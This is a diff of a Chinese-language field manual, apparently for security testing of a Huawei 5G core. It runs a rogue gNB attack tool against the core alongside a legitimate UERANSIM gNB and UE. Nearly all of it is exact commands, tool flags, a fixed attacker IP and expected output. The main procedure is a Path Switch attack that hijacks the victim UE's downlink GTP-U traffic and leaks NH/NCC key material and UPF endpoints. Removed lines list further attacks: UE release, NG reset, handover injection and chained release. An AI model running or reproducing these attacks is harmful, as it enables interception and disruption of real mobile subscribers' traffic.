@@ -1,78 +1,151 @@
 # 华为 AMF 操作手册（现场实测）
 
-测试机是 **Ubuntu**。现场改不了代码，只按本节命令跑。
+文件：`deploy/操作手册_华为AMF.md`。测试机是 **Ubuntu**。现场改不了代码，只按本节命令跑。
 合法 UERANSIM 和流氓 ngap_tester 是同一个华为 AMF 上的两个 gNB。
 
 **华为 AMF-UE-NGAP-ID 每次注册都随机。禁止 sweep。禁止用菜单里的 CASE id。**
 
 ---
 
-## 现场只做这些（抄这一页就够打主线）
+## 这次只做 Path Switch
 
-所有命令都在**仓库根目录**跑（这个目录里同时有 `deploy/`、`config/`、`ngaptester/`）。
-克隆下来可能叫 `NGtester`、`ngap_tester` 或别的，不要死记 `~/ngap_tester`。
+其它攻击先不要跑。全部命令在**仓库根目录**（能同时 `ls deploy/extract-ue-ids.sh config/huawei.json`）。
+克隆目录叫什么都行，不要死记 `~/ngap_tester`。
+
+---
+
+### A. 准备（每个终端都先 `cd` 到仓库根）
 
 ```bash
-# 先确认你在根目录：下面这个文件必须存在
 ls deploy/extract-ue-ids.sh config/huawei.json
-# 不在的话：  cd 到 git clone 出来的那个目录
-
 chmod +x deploy/*.sh deploy/real-amf/*.sh
-./deploy/field-check.sh   # 全绿再往下；红了先看报错，不要硬打
-
-# 终端 A
-./deploy/real-amf/run-gnb.sh
-# 终端 B
-./deploy/real-amf/run-ue.sh
-# 终端 D（gNB+UE 保持注册）
-./deploy/extract-ue-ids.sh
-#   抄 amf-ngap-id = AU
-#   这是问 gNB 的 ue-list，不是问 UE 的 info
-#   若失败：sudo ./deploy/extract-ue-ids.sh --watch 后再重启 run-ue.sh
-
-# 终端 C
-./deploy/ngt.sh sctp-ping
-./deploy/ngt.sh ng-setup
-AU=<刚才抄的数字>
-NGT=./deploy/ngt.sh
-$NGT path-switch --source-amf-ue-id $AU --pdu-sessions 1
-$NGT ue-release --amf-ue-id $AU
-$NGT error-indication --amf-ue-id $AU
-$NGT ng-reset --targets ${AU}:1
-$NGT handover-required --amf-ue-id $AU
-$NGT ho-window-inject --amf-ue-id $AU --mode both
-$NGT ran-config-update --listen 30
-$NGT ul-ran-config-transfer --target-gnb-id 1
-$NGT pdu-notify --amf-ue-id $AU
-$NGT handover-notify --amf-ue-id $AU
-$NGT cell-trace --amf-ue-id $AU
-$NGT ul-ran-status --amf-ue-id $AU
-$NGT ul-nrppa --amf-ue-id $AU
+./deploy/field-check.sh
 ```
 
-有 GUTI / 5G-TMSI 时再打：
+| 终端 | 作用 | 命令 | 停不停 |
+|---|---|---|---|
+| A | 合法 gNB | `./deploy/real-amf/run-gnb.sh` | 一直开着 |
+| B | 合法 UE | `./deploy/real-amf/run-ue.sh` | 一直开着 |
+| D | 读 AU / 看数据面 | 见下面 | 用完即可 |
+| E | 接被切走的下行 GTP-U | 攻击**之前**先开 | 一直开到打完 |
+| C | 流氓 gNB，只发 path-switch | 见下面 | 打一条就退出 |
+
+终端 A 看到 `NG Setup procedure is successful`。  
+终端 B 看到 `Registration is successful` + `PDU Session establishment is successful`，并出现 `uesimtun0`。
+
+### B. 确认会话和内网数据面（不要 ping 8.8.8.8）
 
 ```bash
-$NGT initial-ue --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex>
-$NGT chain-ps-release --source-amf-ue-id $AU --pdu-sessions 1
-$NGT chain-initue-release --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8hex> \
-    --victim-amf-ue-id $AU --release-target both
+./deploy/real-amf/check-up.sh
+./deploy/real-amf/check-up.sh --n3
+# 华为若给了 DNN 内网地址：
+PING_TARGET=<地址> ./deploy/real-amf/check-up.sh
 ```
 
-数据面另开终端：`$NGT gtpu-sink --bind-ip 13.254.241.142 --port 2152`
+记下：`uesimtun0` 的 UE_IP、网关是否回包、`--n3` 是否看到 UDP 2152。  
+有 UE_IP = 会话已建。N6 不回 ping 也继续（华为常禁 ICMP）。
 
-### 现场不要做
+### C. 读这一次的 AMF-UE-NGAP-ID（AU）
 
-| 不要 | 为什么 |
+```bash
+./deploy/extract-ue-ids.sh          # 不要 sudo
+```
+
+抄输出里的 **`amf-ngap-id`**，这就是 `$AU`。没有的话：
+
+```bash
+~/UERANSIM/build/nr-cli --dump
+~/UERANSIM/build/nr-cli UERANSIM-gnb-460-08-1 --exec "ue-list"
+```
+
+gNB 名字以 `--dump` 里 `UERANSIM-gnb-` 那行为准。  
+**禁止 sweep。禁止用上次的 AU。** UE 一重注册必须重读。
+
+### D. 流氓侧探路（终端 C）
+
+```bash
+./deploy/ngt.sh sctp-ping
+# 必须 SUCCESS，源 IP = 13.254.241.142
+./deploy/ngt.sh ng-setup
+# 必须 ACCEPTED。REJECT = 4660/PLMN/切片没开通，不要往下打
+```
+
+华为允许多条 SCTP，**不要停终端 A**。
+
+### E. 开 GTP-U 接收（终端 E，先于攻击）
+
+```bash
+./deploy/ngt.sh gtpu-sink --bind-ip 13.254.241.142 --port 2152
+```
+
+保持开着。攻击前这里应接近安静（下行还在合法 gNB）。
+
+### F. 只打 Path Switch（终端 C）
+
+把 `<AU>` 换成 C 步抄的数字，不要改其它参数：
+
+```bash
+mkdir -p evidence
+./deploy/ngt.sh --evidence evidence/huawei-path-switch.jsonl \
+    path-switch --source-amf-ue-id <AU> --pdu-sessions 1
+```
+
+`--attacker-ip` 默认 `auto`，会绑到 `13.254.241.142`，不要改成实验室的 172.30。
+
+### G. 怎么判断成没成（当场填）
+
+**控制面（看终端 C 打印）：**
+
+| 终端 C 打印（字面） | 记什么 |
 |---|---|
-| `./deploy/ngt.sh sweep …` | 华为 AU 随机，扫不到 |
-| 菜单「Run attack CASE by id」 | CASE **写死 AU=1**，N3 写死 `172.30.200.9`（实验室网），打空/打错 |
-| 菜单里对 AU 回车或打 `sweep` | 会落到 1 或扫 1–32 |
-| 注册完再 `extract-ue-ids.sh 30` 空等 | InitialContextSetup 已经过了，空结果正常 |
-| 用上次的 AU | UE 一重注册就作废 |
-| `./run.sh`（Docker） | 那是连内部核心网的，连不上华为 |
+| `=== CROSS-gNB DISCLOSURE CONFIRMED ===` 且 `LEAKED KEY MATERIAL: NCC=… NH=…` | **控制面成功**（主证据，把 NCC/NH 整行抄下来） |
+| 还有 `LEAKED UPF N3 ENDPOINT` | 额外泄了 UPF 地址/TEID，整行抄下来 |
+| `PathSwitchRequestAcknowledge` 但只有 `PDU … ack-transfer (no UL-TNL…)` | ACK 了、没泄 UPF N3；有没有 NH 分开记 |
+| `PathSwitchRequestFailure` 或 `ErrorIndication` | 华为挡了，把 `reply:` 那一行整行抄下来 |
+| `[path-switch] no reply (victim id likely not resolvable / rejected silently)` | AU 错/过期，或包没到。重做 C 步再打一次 |
 
-菜单选 `7` 发主线可以，但 **AU 必须手填刚读到的数字**。`ho-window-inject` / `initial-ue` / 两条 chain / `sctp-ping` **只有 CLI 有**，菜单里没有。
+**数据面（内网）：**
+
+| 观察 | 成功切面时 | 没切面时 |
+|---|---|---|
+| 终端 E `gtpu-sink` | 出现 GTP-U | 仍然没有 |
+| `check-up.sh --n3`（合法 gNB 的 2152） | 变少或没有 | 和打之前差不多 |
+| `check-up.sh` ping 网关/`PING_TARGET` | 若本来通，现在可能断 | 和打之前一样 |
+
+控制面有 NH、数据面没切：也算成立（Open5GS 2.8 就是这样）。两层都写进表。
+
+### H. 本条记录表（复制下来填）
+
+```
+日期:
+AU（amf-ngap-id）:
+UE_IP / 网关 / ping 是否通（打前）:
+N3 合法侧 2152 打前有没有:
+sctp-ping:
+ng-setup:
+path-switch 回复（ACK/Failure/无回）:
+NH:
+NCC:
+UPF N3（有则抄）:
+gtpu-sink 打后有没有包:
+合法侧 2152 打后:
+ping 打后:
+备注:
+```
+
+打完若还要复测：先让终端 B 的 UE 重新注册，**重新 C 步读 AU**，再从 E/F 来。
+
+### 这次不要做
+
+| 不要 | 原因 |
+|---|---|
+| `ue-release` / `error-indication` / `ng-reset` / 其它 `$NGT` | 这次只测 Path Switch |
+| `sweep` | 华为 AU 随机 |
+| 菜单「Run attack CASE by id」 | AU 写死 1，N3 写死 172.30.200.9 |
+| `./run.sh`（Docker） | 连的是实验室核心网 |
+| 停终端 A 再打 | 华为允许多条 SCTP；停了就没有受害 UE |
+
+其它攻击以后按同样格式往手册后面加。下面第 3 节清单仅供对照，**现场先忽略**。
 
 ---
 
@@ -95,9 +168,9 @@ $NGT chain-initue-release --amf-set-id 0x<setid> --amf-pointer 0x<ptr> --tmsi <8
 
 ---
 
-## 1. 三个终端
+## 1. 三个终端（参考；本次按文首 Path Switch 做）
 
-都在 `ngap_tester/` 目录下。**先起合法侧，再起流氓侧。不要停 UERANSIM。**
+都在**仓库根目录**。**先起合法侧，再起流氓侧。不要停 UERANSIM。**
 
 ```
 终端 A  ./deploy/real-amf/run-gnb.sh      # 合法 gNB，保持开着
@@ -204,9 +277,10 @@ sudo ./deploy/extract-ue-ids.sh -r /tmp/n2.pcap
 
 ---
 
-## 3. 攻击清单（仓库里能跑的全部都在这里）
+## 3. 以后要加的攻击（本次不要跑）
 
-`./deploy/ngt.sh` 的**每一条已实现子命令**都列在下面。华为现场只用 CLI，不要发 CASE id。
+仓库里能跑的 CLI 都列在这里，**方便以后按 Path Switch 同样格式往文首后面加**。
+华为现场这次只打 Path Switch。不要发 CASE id。
 
 `<AU>` = **这一次**从合法 NGAP 读到的 AMF-UE-NGAP-ID。每条命令（除 sctp-ping / gtpu-sink）都会自己再做一次 NG Setup。
 
@@ -347,6 +421,8 @@ $NGT --evidence evidence/huawei-path-switch.jsonl path-switch --source-amf-ue-id
 ---
 
 ## 5. 现场记录表（华为是新靶，开源结论不能直接套）
+
+**这次只填 sctp-ping / ng-setup / path-switch / gtpu-sink 四行。** 其它行留给以后。
 
 | 攻击 | 发出 | AMF 回复 | 受害 UE | 合法 gNB | 备注 |
 |---|---|---|---|---|---|
